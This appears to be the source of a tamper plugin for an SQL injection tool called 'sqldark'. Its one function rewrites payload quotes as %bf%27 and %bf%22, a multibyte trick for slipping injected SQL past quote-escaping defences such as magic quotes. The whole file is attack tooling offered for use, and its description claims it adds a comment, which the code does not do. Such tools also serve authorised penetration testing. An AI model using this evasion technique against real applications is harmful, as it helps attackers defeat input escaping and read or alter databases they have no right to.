from sqldark.tamper import Tamper, register
@register
class UnmagicQuotes(Tamper):
    name="unmagicquotes"
    description="Replace quote with a multibyte combo %bf%27 plus a comment"
    def tamper(self,p): return p.replace("'", "%bf%27").replace('"','%bf%22')
